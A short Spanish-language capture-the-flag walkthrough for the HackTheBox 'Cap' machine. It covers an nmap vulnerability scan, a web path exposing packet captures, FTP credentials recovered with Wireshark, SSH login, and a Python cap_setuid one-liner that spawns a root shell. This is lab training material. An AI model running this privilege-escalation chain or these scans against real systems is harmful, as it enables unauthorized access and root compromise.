# hackthebox-cap
# 🛠️ Guía de Explotación - Máquina 10.129.37.59

## 🔍 1. Enumeración inicial

Se realiza un escaneo completo de puertos con Nmap:

``` bash
sudo nmap -p- --open -sCVS -n -Pn -vvv --script vuln -oN escaneo 10.129.37.59
```

### 📌 Explicación de parámetros:

-   `-p-` → Escanea todos los puertos (1-65535)
-   `--open` → Muestra solo puertos abiertos
-   `-sC` → Ejecuta scripts básicos de Nmap
-   `-sV` → Detecta versiones de servicios
-   `-sS` → Escaneo SYN (sigiloso)
-   `-n` → No resuelve DNS (más rápido)
-   `-Pn` → Omite detección de host activo
-   `-vvv` → Máxima verbosidad
-   `--script vuln` → Ejecuta scripts de vulnerabilidades
-   `-oN escaneo` → Guarda resultados en archivo

## 📊 Resultados

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
    80/tcp open  http    Gunicorn

## 🌐 2. Enumeración Web

http://10.129.37.59/data/0

## 📡 3. Captura de credenciales (Wireshark)

Usuario: nathan\
Contraseña: Buck3tH4TF0RM3!

## 🔑 4. Acceso inicial

``` bash
ssh nathan@10.129.37.59
```

## 🧠 5. Enumeración de privilegios

``` bash
sudo -l
getcap -r / 2>/dev/null
```

## ⚡ 6. Escalada de privilegios

Referencia: https://gtfobins.org/gtfobins/python/#library-load

``` bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## 🏁 7. Flags

User:

``` bash
/home/nathan/user.txt
```

Root:

``` bash
/root/root.txt
```
